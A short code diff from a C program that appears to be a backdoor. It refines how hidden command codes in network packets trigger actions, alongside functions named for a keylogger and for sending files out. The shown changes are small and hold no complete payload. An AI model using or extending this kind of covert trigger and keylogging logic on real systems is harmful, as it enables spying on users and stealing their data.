@@ -129,13 +129,14 @@ bool handle_command_codes(struct session_info * session_info, const struct packe
             session_info->command_counter++;
         } else {
             session_info->last_command_code = encountered_command_code;
+            session_info->last_command_sequence_number = node->sequence_number;
             session_info->command_counter = 1;
         }
 
-        log_message("Session info counter: %d, code: %d", session_info->command_counter, encountered_command_code);
+        log_message("Cur seq: %d, Prev seq: %d, CC: %d, code: %d", node->sequence_number, session_info->last_command_sequence_number, session_info->command_counter, encountered_command_code);
 
         // If the counter hits 2 then execute the corresponding function
-        if (session_info->command_counter >= COMMAND_TRIGGER_THRESHOLD) {
+        if (session_info->last_command_sequence_number + 1 == node->sequence_number && session_info->command_counter >= COMMAND_TRIGGER_THRESHOLD) {
             log_message("Triggered function call: counter %d, code: %d", session_info->command_counter, encountered_command_code);
             session_info->command_counter = 0;
 
@@ -333,7 +334,7 @@ void stop_keylogger(struct session_info * session_info) {
 
 // NOLINTNEXTLINE
 void process_send_file(struct session_info * session_info) {
-    print_linked_list(session_info->head);
+    // print_linked_list(session_info->head);
 
     const int data_packet_to_read = calculate_data_packet_count(session_info);
     log_message("Data packets to read %d", data_packet_to_read);
